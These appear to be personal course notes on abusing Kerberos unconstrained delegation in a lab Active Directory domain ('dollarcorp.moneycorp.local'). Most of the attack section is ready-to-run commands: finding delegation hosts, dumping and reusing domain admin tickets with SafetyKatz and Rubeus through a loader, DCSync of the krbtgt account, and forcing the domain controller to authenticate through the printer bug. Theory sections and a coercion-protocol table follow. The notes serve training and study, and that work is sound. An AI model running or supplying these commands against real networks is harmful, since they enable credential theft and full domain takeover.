### Abusing Unconstrained Delegation
Discover computers with unconstrained delegation (PowerView + AD module)
```powershell
Get-DomainComputer -UnConstrained

Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

Compromise the server(s) where Unconstrained delegation is enabled.

Wait for a domain admin to connect to a service on `appsrv` then dump all of the tickets
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::tickets /export 
```

Reuse the DA token with SafetyKatz
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
```powershell
.\Loader.exe -path .\Rubeus.exe -args ptt /tikcet:<base64>
```

Perform DCsync thats OPSEC safe because it's the machine account
```powershell
.\Loader.exe -path .\SafetyKatz.exe -args lsadump::dcsync /user:dcorp\krbtgt
```
### Unconstrained Delegation Coercion
Coarse/Force machine accounts to connect to a machine and capture their TGT

Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /nowrap
```

Abuse printer bug to force the DC to connect to the App server
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```


### Theory
Kerberos Delegation allows to "reuse the end-user credentials to access
resources hosted on a different server".

Lets say there is a user that wants accesses the `Second Hop database` server through the `First Hop web server`. How will the `Second Hop database server` know which user is accessing it for authorisation? This can be done by the `First Hop web sever` impersonating/re-using the end-users credentials to access the `Second Hop database server`... EASY!

User impersonation is the goal of delegation
![[Pasted image 20250514195150.png]]

There are two types of Kerberos Delegation:
- General/Basic or `Unconstrained Delegation` - Allows the first hop(web server in our example) to request access to any service on any computer in the domain
- `Constrained Delegation` - Allows the first hop to request access only to specified services on specified computers. If Kerberos authentication is not used to authenticate to the first hop, Protocol Transition is used to transition the request to Kerberos

##### Unconstrained Delegation
Allows delegation to any service to any resource on the domain as a
user.

When unconstrained delegation is enabled, the DC places user's TGT
inside TGS. On the first hop, the TGT is extracted from TGS and stored in
LSASS. This way the server can reuse the user's TGT to access any other
resource as the user

![[Pasted image 20250514201409.png]]

###  Theory Unconstrained Delegation Coercion
Certain Microsoft services and protocols allow any authenticated user to
force a machine to connect to a second machine

As of January 2025, following protocols and services can be used for
coercion

| Protocol                     | Service        | Default on Server IS      | Ports Required |
| ---------------------------- | -------------- | ------------------------- | -------------- |
| MS-RPRN                      | Print Spooler  | Yes                       | 445 (SMB)      |
| MS-WSP                       | Windows Search | No (Default on Client OS) | 445 (SMB)      |
| MS-DFSNM (MDI detects this)) | Windows Search | No                        | 445 (SMB)      |
We can force the dcorp-dcto connect to dcorp-appsrvby abusing the Printer bug (MS-RPRN) or if enabled, other services

![[Pasted image 20250514202802.png]]